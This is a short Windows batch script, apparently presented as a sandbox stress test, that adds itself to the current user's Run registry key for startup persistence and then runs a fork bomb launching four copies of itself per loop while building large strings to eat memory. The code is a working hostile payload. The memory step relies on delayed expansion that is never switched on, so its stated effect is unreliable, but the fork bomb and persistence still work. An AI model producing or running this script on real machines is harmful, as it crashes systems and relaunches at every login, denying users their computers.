@echo off
:: Enhanced fork bomb + memory eater with STARTUP PERSISTENCE
:: For Windows Sandbox testing only
title STRESS_TEST_PERSISTENT

:: --- INSTALL STARTUP PERSISTENCE (runs once) ---
set "SCRIPT_PATH=%~f0"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SandboxStressTest" /t REG_SZ /d "%SCRIPT_PATH%" /f >nul 2>&1

:: --- FORK BOMB + MEMORY EATER ---
set /a counter=0

:loop
:: Launch 4 copies recursively
start "" /b %0
start "" /b %0
start "" /b %0
start "" /b %0

:: Consume memory (approx 100MB per loop)
set "garbage="
for /l %%i in (1,1,1000000) do set "garbage=!garbage!X"
set "garbage2="
for /l %%i in (1,1,1000000) do set "garbage2=!garbage2!X"

goto loop